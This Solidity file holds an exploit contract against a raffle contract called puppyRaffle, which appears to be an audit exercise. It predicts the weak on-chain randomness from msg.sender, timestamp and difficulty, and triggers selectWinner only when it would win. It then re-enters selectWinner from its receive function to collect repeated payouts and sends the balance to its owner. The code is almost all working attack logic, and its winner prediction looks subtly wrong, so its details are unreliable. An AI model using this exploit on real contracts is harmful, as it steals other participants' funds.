// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/fa64a1ced0b70ab89073d5d0b6e01b0778f7e7d6/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/fa64a1ced0b70ab89073d5d0b6e01b0778f7e7d6/contracts/access/Ownable.sol";
import {Address} from "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/fa64a1ced0b70ab89073d5d0b6e01b0778f7e7d6/contracts/utils/Address.sol";
import {Base64} from "https://github.com/Brechtpd/base64/blob/dcbf852ba545b3d15de0ac0ef88dce934c090c8e/base64.sol";


interface puppyRaffle{
    function enterRaffle(address[] memory newPlayers) external payable;
    function getActivePlayerIndex(address player) external view returns (uint256);
    function selectWinner() external;
}

// WHAT IS THE ATTACK?

// You validate that 

//  uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length; 

// gives your index, if so then you call the selectWinner() function, and do re-entrancy from your recieve function proving re-entrancy.

contract exploitPuppy{

    address public owner;

    puppyRaffle public object;

    uint public exploitAttempts;
    uint public counterForRecieve;

    uint raffleFees;

    event PossiblyOwnerWins(uint ownerIndex, uint winnerIndex);
    event NotWin(string reason, uint winnerIndex);
    event RecieveCalled(uint e);

    //
    uint public attackerIndexInPuppyRaffle;
    uint public totalParticpantsInRaffe;
    //

    constructor(address vulnerableSmartContractAddress, uint _exploitAttempts, uint _raffleFees){
        owner = msg.sender;
        object = puppyRaffle(vulnerableSmartContractAddress);
        exploitAttempts = _exploitAttempts;
        raffleFees = _raffleFees;
    }

    modifier onlyOwner{
        require(msg.sender == owner);
        _;
    }

    // FUNCTIONS FOR DEBUGGING PURPOSES

    // function enterRaffleTest() public payable onlyOwner {
    //     address[] memory arrayForRaffle = new address[](1);
    //     arrayForRaffle[0]=address(this);
    //     object.enterRaffle{value: raffleFees}(arrayForRaffle);
    // }

    // function getOwnerIndexTest() public view onlyOwner returns(uint) {
    //     return (object.getActivePlayerIndex(address(this)));
    // }

    // function getTotalParticipantsTest() public onlyOwner {
    //     uint totalRaffleParticipants;  bool validIndex; uint counter;
       
    //     while(validIndex){

    //         (bool success, ) = address(object).call(abi.encodeWithSignature("players(uint256)", counter));
    //         if(success){
    //             totalRaffleParticipants+=1;
    //             counter++;
    //             validIndex=true;
    //         }
    //         else{
    //             validIndex=false;
    //         }

    //     }       
    // }

    function enterRaffle_1() public onlyOwner {
        address[] memory attacker = new address[](1);
        attacker[0] = address(this);
        object.enterRaffle{value: raffleFees}(attacker);
    }

    function getPlayerIndex_2() public onlyOwner {
         attackerIndexInPuppyRaffle = object.getActivePlayerIndex(address(this));
    }

    function getTotalParticipants_3() public onlyOwner {
        
        bool playerFound=true;
        uint totalPlayers=0;

        while(playerFound){
            (bool success, ) = address(object).call(abi.encodeWithSignature("players(uint256)", totalPlayers));
            if(success){
                totalPlayers++;
            }else{
                playerFound=false;
            }
        }
        totalParticpantsInRaffe = totalPlayers;
    }

    function selectWinner_4() public onlyOwner {
        if(uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % totalParticpantsInRaffe == attackerIndexInPuppyRaffle){
            object.selectWinner();
        }
        else{
            emit NotWin("The winner is of index", uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % totalParticpantsInRaffe);
        }
    }

    receive() external payable { 
        if(counterForRecieve < exploitAttempts){
            object.selectWinner();
        }

        emit RecieveCalled(counterForRecieve);
        counterForRecieve++;
    }

    function OOAviewContractBalanace() public view returns (uint) {
        return address(this).balance;
    }

    function OOAtransferFundsToOwner() public onlyOwner{
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

     function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

}
